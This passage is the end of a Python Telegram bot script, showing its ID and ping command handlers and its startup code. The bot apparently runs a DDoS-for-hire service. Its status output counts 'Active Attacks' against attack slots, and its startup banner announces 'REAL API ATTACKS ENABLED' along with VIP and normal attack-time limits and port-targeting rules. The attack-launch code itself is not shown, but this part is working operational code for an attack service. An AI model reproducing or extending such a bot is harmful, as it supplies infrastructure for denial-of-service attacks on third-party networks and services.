        return
    
    set_maintenance(False)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆 𝑴𝒐𝒅𝒆 𝑶𝑭𝑭!</b>\n\n𝑩𝒐𝒕 𝒊𝒔 𝒏𝒐𝒘 𝒏𝒐𝒓𝒎𝒂𝒍.", reply_to=message)

# ============ ID / PING COMMANDS ============

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f"{HTML_EMOJI.PROFILE} <b>𝒀𝒐𝒖𝒓 𝑰𝑫:</b> <code>{user_id}</code>", reply_to=message)

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    
    total_users = users_collection.count_documents({})
    maintenance_status = f"{HTML_EMOJI.CHECKMARK} 𝑫𝒊𝒔𝒂𝒃𝒍𝒆𝒅" if not is_maintenance() else f"{HTML_EMOJI.CROSS} 𝑬𝒏𝒂𝒃𝒍𝒆𝒅"
    
    uptime_seconds = (datetime.now() - bot_start_time).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    
    busy_slots, free_slots, total_slots = get_slot_status()
    active_groups = approved_groups_collection.count_documents({})
    private_users = bot_users_collection.count_documents({})
    blocked_ips_count = len(get_all_blocked_ips())
    
    response = f"{HTML_EMOJI.LIVE} <b>𝑩𝒐𝒕 𝑷𝒐𝒏𝒈!</b>\n\n"
    response += f"{HTML_EMOJI.FIRE} <b>𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 𝑻𝒊𝒎𝒆:</b> {response_time} 𝒎𝒔\n"
    response += f"{HTML_EMOJI.EXPLOSION} <b>𝑨𝒄𝒕𝒊𝒗𝒆 𝑨𝒕𝒕𝒂𝒄𝒌𝒔:</b> {busy_slots}/{total_slots}\n"
    response += f"{HTML_EMOJI.USERS} <b>𝑨𝒄𝒕𝒊𝒗𝒆 𝑮𝒓𝒐𝒖𝒑𝒔:</b> {active_groups}\n"
    response += f"{HTML_EMOJI.PROFILE} <b>𝑷𝒓𝒊𝒗𝒂𝒕𝒆 𝑼𝒔𝒆𝒓𝒔:</b> {private_users}\n"
    response += f"{HTML_EMOJI.BAN} <b>𝑩𝒍𝒐𝒄𝒌𝒆𝒅 𝑰𝑷𝒔:</b> {blocked_ips_count}\n"
    response += f"{HTML_EMOJI.LOCK} <b>𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆 𝑴𝒐𝒅𝒆:</b> {maintenance_status}\n"
    response += f"{HTML_EMOJI.TIMER} <b>𝑼𝒑𝒕𝒊𝒎𝒆:</b> {uptime_str}"
    
    safe_send_message(message.chat.id, response, reply_to=message)

# ============ START BOT ============

print("=" * 60)
print("BOT STARTING WITH REAL API ATTACKS")
print("=" * 60)
print(f"BOT_TOKEN: {'SET' if BOT_TOKEN else 'MISSING'}")
print(f"API_BASE_URL: {'SET' if API_BASE_URL else 'MISSING'}")
print(f"API_KEY: {'SET' if API_KEY else 'MISSING'}")
print(f"Max Simultaneous Slots: {current_max_slots}")
print(f"Concurrent Per Attack: {get_concurrent_limit()}")
print(f"Max Attack Time (Normal): {get_max_attack_time()}s")
print(f"VIP Max Attack Time: {get_key_max_attack('VIP')}s")
print(f"NORMAL Max Attack Time: {get_key_max_attack('NORMAL')}s")
print(f"Cooldown: {get_user_cooldown_setting()}s")
print(f"IP Blocking: Active")
print("=" * 60)
print("ALL COMMANDS WORKING")
print("REAL API ATTACKS ENABLED")
print("STATUS COMMAND AUTO-UPDATES EVERY 5 SECONDS")
print("NON-BLOCKING ATTACKS - BOT RESPONSIVE")
print("PORT PROTECTION: SAME PORT CANNOT BE ATTACKED WHILE ACTIVE")

if __name__ == "__main__":
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN is empty! Bot cannot start.")
        exit(1)
    try:
        bot.infinity_polling(timeout=20, long_polling_timeout=20)
    except Exception as e:
        print(f"Main bot error: {e}")